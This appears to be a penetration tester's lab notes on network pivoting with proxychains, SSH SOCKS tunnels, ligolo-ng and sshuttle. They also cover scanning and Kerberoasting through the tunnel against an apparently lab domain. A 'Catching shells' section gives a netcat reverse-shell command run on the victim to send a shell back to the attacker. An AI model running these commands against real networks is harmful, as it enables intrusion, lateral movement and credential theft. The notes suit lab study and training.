

```
vim /etc/proxychains
socks4 127.0.0.1 9050
```



```
ssh -f -N -D 9050 -i pivot root@10.10.XX.XX
```

- Options
	- `-f`
		- Backgrounds the ssh session
	- `-N`
		- no command execute
	- `-D`
		- To bind a port

```
proxychains nmap 10.10.XX.XX 
```


```
proxychains nmap 10.10.XX.XX -sT
```


```
proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip -request
```



---

using ligolo


```
kali@kali ~/h/ligolo> ./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended)
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0008] Agent joined.                                 name="MARVEL\\administrator@HYDRA-DC" remote="192.168.78.129:60941"

```


on victim

```
agent.exe -connect 192.168.78.128:11601 -ignore-cert
```


to continue lets say you find the internal ip of `10.10.200.10`, make that addition to the routing terminal in another terminal

```
sudo ip route add 10.10.200.0/24 dev ligolo
```

just to check
```
ip route list
```

now go back to proxy server on ligolo, make sure your in the right session just by using `session` and then just use start
```
start
```

just to text

```
nxc smb 10.10.200.0/24
```



### Catching shells

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
						^                 ^
					 VICTIM              YOU
				    10.10.200.10      192.168.78.129:4444
```

when you want to send a shell, you send it TO THE VICTIM IP AND PORT. 

In our situation we have declared that our target is `10.10.200.10` and we set up now the port on `1234` so when we wanna send a shell for example it would be

on victim machine
```
nc.exe 10.10.200.10 1234 -e cmd
```

then this will redirect to YOUR IP and port that YOU set which it in this case `192.168.78.129:4444`


https://youtu.be/DM1B8S80EvQ




----

# Sshuttle

`sshuttle -r root@10.10.10.10 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`